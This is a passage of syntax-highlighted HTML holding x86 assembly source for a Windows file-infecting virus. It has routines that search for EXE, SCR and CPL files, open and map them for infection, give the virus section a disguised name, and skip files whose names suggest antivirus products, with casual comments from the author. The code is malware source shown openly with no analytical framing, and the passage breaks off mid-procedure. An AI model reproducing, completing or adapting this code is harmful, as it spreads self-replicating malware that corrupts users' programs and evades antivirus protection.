       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">; Return from this</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">TextHeader</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Some data...</span><span class="sc0">
</span><span class="sc5">RelocHeader</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LastHeader</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">StartOfLastSection</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PEHeaderAddress</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CryptValue2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; This value is set somewhere...</span><span class="sc0">

</span><span class="sc5">Sav_NumberOfSections</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SectionNames</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SZSectionNames</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".text"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".bss"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".rsrc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"INITTASK"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".pdata"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".tls"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".Script"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".petite"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"INIT"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WINEXEC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".rdata"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".udata"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$$DOSX"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".PCPEC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PREVIEW"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".OBJ"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"_winzip_"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".PATCH"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$prfth"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PEPACK!!"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"_cabinet"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"actdlvry"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".adata"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".textbss"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".CPS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"_mvdata"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".check"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"BSS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".dcode"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".WWP32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".mdata"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".debug"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".data"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"DATA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".dllent"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".WOPEC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".PEpsi"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".drectve"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Ext_Cab1"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".gdata"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ANAKiN98"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"_sfxrun_"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".edata"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".fearzip"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".idata"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CODE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".petprg"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".delete"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ConstructNameForReloc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@@Loop01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Loop01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">SectionNames</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Loop01</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">SZSectionNames</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">SZSectionNames</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                   </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">ConstructNameForReloc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FindFileMask1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Masks for FindFirstFile and FindNext</span><span class="sc0">
</span><span class="sc5">FindFileMask2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.SCR'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFileMask3</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.CPL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Oh, I know this function is only called once, but the code is more struc-</span><span class="sc0">
</span><span class="sc1">;; tured with this and more clear to me. Moreover, if I want to put more than</span><span class="sc0">
</span><span class="sc1">;; one calls to this function in the future... hey, I'll have it coded already</span><span class="sc0">
</span><span class="sc1">;; :)</span><span class="sc0">
</span><span class="sc5">OpenFile</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; ??? (I don't remember exactly why this</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0c0000000h</span><span class="sc0">  </span><span class="sc1">; values and no others :)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; EBX=RVA to the file name (in FindFileField)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CreateFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Open the file</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">      </span><span class="sc1">; If error, return carry flag</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save handle...</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">                </span><span class="sc1">; ...clear carry flag...</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                </span><span class="sc1">; ...and return</span><span class="sc0">
      </span><span class="sc5">@@Error</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OpenFile</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function opens a mapping over the file represented in FindFileField.</span><span class="sc0">
</span><span class="sc1">;; The data there is used here (well, file size only, but I save a lot of</span><span class="sc0">
</span><span class="sc1">;; work if I use it in this manner)</span><span class="sc0">
</span><span class="sc5">MapFile</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@FinError</span><span class="sc0">  </span><span class="sc1">; If error, exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Open mapping</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; If error, exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@FinError2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save mapping</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">; RVA here, clear carry flag</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; and return</span><span class="sc0">
</span><span class="sc5">@@FinError2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingHandle</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;If error, close handle</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CloseHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;of file mapping, set</span><span class="sc0">
</span><span class="sc5">@@FinError</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">; carry flag and exit.</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MapFile</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">MappingHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Variables</span><span class="sc0">
</span><span class="sc5">MappingAddress</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileHandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This function, although it seems false, unmaps a previous mapping of a</span><span class="sc0">
</span><span class="sc1">;; file :P</span><span class="sc0">
</span><span class="sc5">UnmapFile</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CloseHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">UnmapFile</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function checks a file name to determine if it's a "dangerous" file</span><span class="sc0">
</span><span class="sc1">;; if infected or we can infect it without problems (theorically). It checks</span><span class="sc0">
</span><span class="sc1">;; the file name to see if it begins with TB (Thunderbyte appz), SC (Scan and</span><span class="sc0">
</span><span class="sc1">;; others, normally McCafÇ one), F- (F-Potatoe), PA (Panda Antivirus), DR</span><span class="sc0">
</span><span class="sc1">;; (DrWeb) and NO (Nod-Ice), or it has a "V" in any position (it's usual for</span><span class="sc0">
</span><span class="sc1">;; an antivirus to have a "V" in the name, like AVP, DSAV, etc.)</span><span class="sc0">
</span><span class="sc5">CheckFileName</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">@@Loop_001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@@Loop_002</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndName2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndName2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_002</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndName</span><span class="sc0">
    </span><span class="sc5">@@EndName2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@@EndName</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cld</span><span class="sc0">            </span><span class="sc1">; Here we have the file name without path</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">          </span><span class="sc1">; Read the two first letters</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ToLower</span><span class="sc0">  </span><span class="sc1">; Convert them to lowercase</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'bt'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'cs'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'-f'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'ap'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
